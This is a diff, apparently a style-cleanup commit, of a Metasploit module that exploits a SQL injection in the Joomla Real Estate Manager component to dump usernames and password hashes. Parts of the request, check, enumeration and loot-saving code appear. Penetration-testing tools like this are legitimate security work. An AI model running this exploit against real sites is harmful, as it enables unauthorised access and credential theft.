@@ -1,47 +1,51 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Auxiliary::Report
   include Msf::Exploit::Remote::HttpClient
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'Joomla Real Estate Manager Component Error-Based SQL Injection',
-      'Description'    => %q{
-        This module exploits a SQL injection vulnerability in Joomla Plugin
-        com_realestatemanager versions 3.7 in order to either enumerate
-        usernames and password hashes.
-      },
-      'References'     =>
-        [
+    super(
+      update_info(
+        info,
+        'Name' => 'Joomla Real Estate Manager Component Error-Based SQL Injection',
+        'Description' => %q{
+          This module exploits a SQL injection vulnerability in Joomla Plugin
+          com_realestatemanager versions 3.7 in order to either enumerate
+          usernames and password hashes.
+        },
+        'References' => [
           ['EDB', '38445']
         ],
-      'Author'         =>
-        [
+        'Author' => [
           'Omer Ramic', # discovery
           'Nixawk', # metasploit module
         ],
-      'License'        => MSF_LICENSE,
-      'DisclosureDate' => 'Oct 22 2015'
-    ))
+        'License' => MSF_LICENSE,
+        'DisclosureDate' => '2015-10-22',
+        'Notes' => {
+          'Reliability' => UNKNOWN_RELIABILITY,
+          'Stability' => UNKNOWN_STABILITY,
+          'SideEffects' => UNKNOWN_SIDE_EFFECTS
+        }
+      )
+    )
 
     register_options(
       [
         OptString.new('TARGETURI', [true, 'The relative URI of the Joomla instance', '/'])
-      ], self.class)
+      ]
+    )
   end
 
-  def print_good(message='')
+  def print_good(message = '')
     super("#{rhost}:#{rport} - #{message}")
   end
 
-  def print_status(message='')
+  def print_status(message = '')
     super("#{rhost}:#{rport} - #{message}")
   end
 
@@ -83,9 +87,9 @@ class MetasploitModule < Msf::Auxiliary
 
     data = sqli(payload)
     if data && data.include?(flag)
-      Msf::Exploit::CheckCode::Vulnerable
+      Msf::Exploit::CheckCode::Vulnerable('SQL injection confirmed in com_realestatemanager')
     else
-      Msf::Exploit::CheckCode::Safe
+      Msf::Exploit::CheckCode::Safe('SQL injection test payload was not reflected in response')
     end
   end
 
@@ -109,9 +113,8 @@ class MetasploitModule < Msf::Auxiliary
 
     res = send_request_cgi({
       'uri' => normalize_uri(target_uri.path, 'index.php'),
-      'vars_get'  => get,
+      'vars_get' => get,
     })
-
 
     if res && res.code == 200
       cookie = res.get_cookies
@@ -123,7 +126,7 @@ class MetasploitModule < Msf::Auxiliary
         'uri' => normalize_uri(target_uri.path, 'index.php'),
         'method' => 'POST',
         'cookie' => cookie,
-        'vars_get'  => get,
+        'vars_get' => get,
         'vars_post' => post
       })
 
@@ -187,7 +190,7 @@ class MetasploitModule < Msf::Auxiliary
     colc = sqli(query)
     vprint_status("Found Columns: #{colc} from #{database}.#{table}")
 
-    valid_cols = [   # joomla_users
+    valid_cols = [ # joomla_users
       'activation',
       'block',
       'email',
@@ -217,6 +220,7 @@ class MetasploitModule < Msf::Auxiliary
         loop do
           value = sqli(query_fmt % [col, l, i])
           break if value.blank?
+
           record[col] << value
           l += 54
         end
@@ -247,12 +251,14 @@ class MetasploitModule < Msf::Auxiliary
       tables.each do |table|
         cols = query_columns(db, table)
         next if cols.blank?
+
         path = store_loot(
           'joomla.users',
           'text/plain',
           datastore['RHOST'],
           cols.to_json,
-          'joomla.users')
+          'joomla.users'
+        )
         print_good('Saved file to: ' + path)
       end
     end
